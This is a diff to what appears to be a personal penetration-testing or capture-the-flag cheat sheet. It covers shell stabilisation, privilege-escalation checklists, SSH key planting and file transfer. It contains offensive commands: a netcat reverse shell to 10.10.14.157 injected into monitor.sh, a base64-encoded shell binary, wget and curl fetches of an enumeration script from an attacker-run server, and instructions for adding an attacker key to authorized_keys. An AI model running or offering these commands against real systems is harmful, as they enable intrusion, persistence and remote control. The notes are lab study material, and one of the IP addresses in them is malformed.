@@ -85,7 +85,7 @@ look the source code : f12 or ctrl+U
 
 ```bash
 
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ^Z
 stty raw echo
 fg
@@ -108,3 +108,94 @@ IIS : C:\inetpub\wwwroot\
 apache : /var/www/html
 nginx : /usr/local/nginx/html
 xampp : C:\xampp\htdocs
+
+## Privesc
+
+HackTricks/payloadsalltheThings for procédure and checklist
+
+#### Enumeration scripts
+
+Linux :
+Linpeas
+LinEnum
+linuxprivchecker
+
+Windows :
+seatbelt
+JAWS
+
+#### Kernel exploit
+
+---> searchsploit
+
+#### Vuln software
+
+Linux:
+```bash
+dpkg -l
+```
+
+windows:
+check C:\Program Files
+
+#### User Priv
+
+sudo
+SUID
+Windows Token Privilèges
+
+GTFOBins
+LOLBAS & LOLLIBZ
+
+Living off the land = utiliser les tools sur le terrain
+#### Scheduled task
+
+/etc/crontab
+/etc/cron.d
+/var/spool/cron/crontabs/root
+
+#### Exposed creds
+
+bash_history
+PSreadLine
+
+#### SSH Keys
+
+/home/user/.ssh/
+/root/.ssh/
+
+place our public key : /home/user/.ssh/authorized_keys
+ssh-keygen
+
+## File transfer
+
+```bash
+
+python3 -m http.server 8000
+
+wget http://10.10.10121:8000/linenum.sh
+# or
+curl http://10.10.10121:8000/linenum.sh -o linenum.sh
+
+```
+
+#scp 
+```bash
+scp linenum.sh user@remotehost:/tmp/linenum.sh
+```
+
+to bypass some restriction
+#base64 
+```bash
+base64 shell -w 0
+
+#copy/past
+
+echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+
+```
+
+
+
+10.10.14.157
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.157 8443 >/tmp/f' | tee -a monitor.sh
